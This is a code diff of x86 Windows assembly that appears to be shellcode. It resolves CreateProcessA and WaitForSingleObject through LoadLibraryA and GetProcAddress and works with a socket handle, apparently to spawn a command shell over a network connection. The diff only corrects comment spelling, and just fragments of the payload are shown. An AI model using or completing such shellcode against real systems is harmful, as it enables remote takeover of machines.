@@ -9,11 +9,11 @@
 ; Output: None.
 ; Clobbers: EAX, EBX, ECX, ESI, ESP will also be modified
 ; Calling getprocaddress and loadlibraryA smashes the following regs: EAX, ECX, EDX, ESP
-; Coming in LoadLibA is in EBX and GetprocessAddress is in ESI
+; Coming in LoadLibA is in EBX and GetprocAddress is in ESI
 ; socket is in EDI coming in
 
 ;Do a loadlibA of kernel32
-;then getprocessaddress of 'CreateProcessA'
+;then getprocaddress of 'CreateProcessA'
   push 0x0
   push 0x32336c65         ; Push kernel32 on the stack
   push 0x6e72656b         ; ...
@@ -26,7 +26,7 @@
   push 0x61657243         ; ...
   push esp                ; Push a pointer to CreateProcessA string on the stack
   push eax                ; Push handle for kernel32 on the stack
-  call dword [esi]        ; Call getprocessaddress | CreateProcessA address in EAX
+  call dword [esi]        ; Call getprocaddress | CreateProcessA address in EAX
 
   xchg ebp, eax           ; Put createprocessa in ebp
 
@@ -96,7 +96,7 @@ push_loop:               ;
   call dword [ebx]        ; handle for kernel32 now in eax
   
   ;loadLiba ebx, getprocaddr edi, PROCESS_INFORMATION Structure esi, kernel32 eax
-  ; getprocessaddress of 'WaitForSingleObject'
+  ; getprocaddress of 'WaitForSingleObject'
   push 0x00746365         ; Push WaitForSingleObject
   push 0x6a624f65         ; ...
   push 0x6c676e69         ; ...
@@ -105,7 +105,7 @@ push_loop:               ;
   push esp                ; Push pointer for WaitForSingleObject
   push eax                ; Push handle for kernel32
   xchg eax, ebp           ; mov kernel32 to ebp
-  call dword [edi]        ; GetprocessAddress (kernel32, WaitForSingleObject)
+  call dword [edi]        ; GetprocAddress (kernel32, WaitForSingleObject)
   xchg ebp, eax           ; Push waitforsingleobject address in ebp and kernel32 to eax
   
   ;loadLiba ebx, getprocaddr edi, PROCESS_INFORMATION Structure esi, kernel32 eax, waitforsingleobject ebp
